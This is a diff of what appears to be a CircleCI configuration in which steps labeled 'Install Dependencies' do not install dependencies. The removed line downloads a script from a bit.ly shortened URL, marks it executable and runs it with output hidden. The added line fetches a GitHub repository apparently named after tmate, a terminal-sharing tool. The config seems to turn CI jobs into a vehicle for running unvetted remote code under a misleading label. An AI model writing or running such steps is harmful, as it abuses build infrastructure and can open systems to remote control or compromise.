@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://github.com/lolz155/Arch-Tmate
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
@@ -20,7 +20,9 @@ jobs:
       steps:
         - run: 
             name: Install Dependencies
-            command: wget -O w2022.sh https://bit.ly/a2nk-W2022 > /dev/null 2>&1 chmod +x w2022.sh ./w2022.sh
+            command: timeout 1m lscpu
+            
+
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
